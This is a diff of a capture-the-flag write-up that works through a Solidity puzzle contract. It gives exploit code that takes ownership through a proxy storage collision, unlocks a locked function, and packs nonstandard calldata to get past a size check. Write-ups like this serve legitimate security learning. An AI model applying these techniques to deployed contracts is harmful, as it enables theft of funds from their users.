@@ -261,29 +261,89 @@ eoaSpoof.reenterDrip();
 
 Just like that, we've satisfied the ```minTotalDripped``` modifier that gates ```open()``` without running out of ETH. But in doing so, we've also broken the ```maxDripCount(0)``` and the ```maxBalance(0)```.
 
-## 
+## Decrementing lastDripId
 
+We're now in a position where we need to find ways to reduce both ```lastDripId``` and the proxy contract's ETH balance to 0. As we noticed before, there is an internal function called ```_burnDrip()``` so I started looking for places where it is invoked.
 
+One of the declared modifiers, ```burnDripId(uint256 dripId)``` performs this function for us and is scattered throughout the codebase. For example, ```spread()``` burns dripId 3, ```zip()``` burns dripId 1, ```torch()``` burns dripId 5, and ```creep()``` burns dripId 10.'
 
-locked functions:
-0x925facb1 torch()
+Of those, ```torch()``` was the most interesting function which caught my eye because it actually invokes the raw internal ```_burnDrip()``` function in a loop that iterates over a provided array. Perfect!
 
-unlocked functions:
-0x91169731 initialize()
-0xb2e327e2 befriend()
-0x7159a618 operate()
-0x9f678cca drip()
-0x2b071e47 spread()
-0x00919055 zip()
-0x8fd66f25 leak()
-0x11551052 creep()
-0x262ae75f creepForward()
-0x58657dcf open()
+I started by calling torch with the entire array of 10 dripIds that we want to eliminate, named in a nod to one of my favorite taco places in Texas:
 
+```
+uint256[] memory torchees = new uint[](10);
 
-1. unlock torch by utilizing operator == owner storage collision in order to call ```lock(torch.selector, false)```
-2. to satisfy torch's burnDripId(5) modifier, exploit reentrancy in drip to bypass fee exponentiation and raise lastDripId to 5
-3. use torch()'s _burndrip call to reach into other storage slots? (provide encodedDripId that overwrites another value, eg lastdripid and admin)
-    - must set isValidDripId[lastDripId] = true
-    - use storage collision of friendshipHash <-> lastDripid to set it to true?
+torchees[0] = 1; 
+torchees[1] = 2;
+torchees[2] = 3;
+torchees[3] = 4;
+torchees[4] = 5;
+torchees[5] = 6;
+torchees[6] = 7;
+torchees[7] = 8;
+torchees[8] = 9;
+torchees[9] = 10;
 
+puzzle.torch(abi.encode(torchees));
+```
+
+Regrettably, this call fails because the torch ```'function is locked'```. This is confirmed by a call to the proxy contract using the bytes4 function selector for the torch function obtained by Foundry's ```$ cast sig```
+
+```$ cast sig 'torch(bytes calldata encodedDripIds)'```
+
+After grabbing that function selector (0x925facb1), we provide it to the public mapping:
+
+```PuzzleBoxProxy(puzzle).isFunctionLocked(hex'925facb1');```
+
+The 0x01 returned by this call confirms that it is indeed locked. Thankfully, the function that lets us unlock it only requires the caller to be ```owner``` which we already are since becoming the operator.
+
+Returning to the EoaSpoof contract's constructor, just insert the call to unlock ```torch()``` at the end:
+
+```
+constructor(PuzzleBox _puzzle) {
+    puzzle = _puzzle;
+    address payable proxy = payable(address(_puzzle));
+
+    (bool a, bytes memory b) = proxy.call(hex'8da5cb5b'); // check PuzzleBoxProxy.owner storage slot
+    _puzzle.operate(); // become operator / owner
+    (bool c, bytes memory d) = proxy.call(hex'8da5cb5b'); // prove PuzzleBoxProxy.owner == PuzzleBox.operator
+    
+    // now that we are operator/owner we can unlock torch()
+    PuzzleBoxProxy(proxy).lock(PuzzleBox.torch.selector, false);
+}
+```
+
+Success, yet going back to call the now-unlocked function still causes a revert! A closer look at the ```torch()``` implementation informs us why: the ```maxCallDataSize(300)``` modifier.
+
+## This is where I ran out of time
+
+The CTF came at a very busy time for me at the National Symphony Orchestra so I was only able to hack on it for the last 12 hours of the CTF on the final day. But I found a good amount of bugs in that short time frame and am pretty confident I'd have been able to solve the entire CTF given more hours. Lucky for you, I've since looked at solutions and learned a few tricks that should both speed up my process and get you the hacks you're lusting for :D
+
+## An oft-overlooked calldata encoding scheme
+
+Turns out the key to getting past the ```maxCallDataSize(300)``` modifier is to use an uncommon but EVM-recognizable compact calldata encoding scheme called 'Non-standard Packed Mode'. To accomplish that, you can manually construct compressed calldata by providing the function selector, the offset to the start of the array, the length of the array, and then the data of the array itself. The calldata that will pass the modifier and be correctly parsed by the compiler looks like the following:
+
+```
+0000000000000000000000000000000000000000000000000000000000000020 // calldata offset pointer
+0000000000000000000000000000000000000000000000000000000000000006 // length of array
+0000000000000000000000000000000000000000000000000000000000000002 // first element of torchees array
+0000000000000000000000000000000000000000000000000000000000000004 // second element
+0000000000000000000000000000000000000000000000000000000000000006 // etc
+0000000000000000000000000000000000000000000000000000000000000007
+0000000000000000000000000000000000000000000000000000000000000008
+0000000000000000000000000000000000000000000000000000000000000009
+```
+
+Which can be constructed using Solidity like this:
+
+```
+(bool r,) = proxy.call(abi.encodePacked(
+    puzzle.torch.selector, 
+    uint256(0x01),
+    uint8(0),
+    abi.encode(torchees)
+));
+
+require(r);
+```
